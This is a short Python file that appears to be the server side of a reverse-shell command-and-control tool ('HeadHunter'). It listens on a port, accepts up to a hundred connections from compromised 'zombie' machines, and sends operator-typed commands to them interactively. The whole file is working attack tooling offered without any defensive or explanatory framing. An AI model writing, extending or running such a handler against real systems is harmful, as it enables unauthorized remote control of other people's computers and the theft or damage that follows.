import socket
import threading
import sys 
import time



def acceptor(c, addr, s):
		
	i = 1
	while True:
		c[i], addr[i] = s.accept()
		print("\ngot connection from " + str(addr[i]) + " starting session. Type any command or press enter to return to previous session\n")
		i+=1
		

def listen(host, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(100)

	print("\nListening on port " + str(port) + " for connections")
	
	global c
	global addr	
	c = [None for i in range(100)]
	addr = [None for i in range(100)]

	c[0], addr[0] = s.accept()

	print("got connection from " + str(addr[0]) + " starting reverse shell session. Type \"exit\" to return to HeadHunter interactive shell\n")

	thread = threading.Thread(target=acceptor, args=(c, addr, s))
	thread.start()
	global activefd
	global activeaddr
	activefd = c[0]
	activeaddr = addr[0]
	control(activefd)
	


def control(zombie):

	try:
		time.sleep(1)
		while True:	
			
			cmd = zombie.recv(5024).decode()	
			sys.stdout.write(cmd)

			d = input()

			if(d == "exit"):
				break;

			d += "\n"
			zombie.send(d.encode())
			time.sleep(0.1)		#This sleep is required to allow the zombie to finish processing the command


			sys.stdout.write("\033[A"+cmd.split("\n")[-1])		#Removes duplicate command from stdout
			
			
	except Exception as e:
		print("Error: " + str(e))
